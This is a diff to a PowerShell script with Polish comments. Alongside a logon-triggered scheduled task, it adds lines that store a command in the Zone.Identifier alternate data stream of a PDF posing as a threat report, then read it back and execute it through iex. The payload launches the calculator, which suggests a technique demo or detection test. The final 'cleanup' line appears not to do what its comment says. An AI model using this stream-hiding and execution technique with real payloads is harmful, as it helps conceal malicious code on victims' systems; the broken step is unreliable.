@@ -40,5 +40,15 @@ $trigger = New-ScheduledTaskTrigger -AtLogOn
 
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "UruchomienieSkryptuNaStart"
 
+#ustawienie metadanych pliku na cmdlt otwierający kalkulator
+sc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier @"
+saps calc
+"@
+
+#wywołanie polecenia z metadanych pliku
+gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | iex
+
+#usunięcie metadanych z pliku
+gc $home\Desktop\2022_ThreatDetectionReport_RedCanary.pdf -s Zone.Identifier | ri
 
 
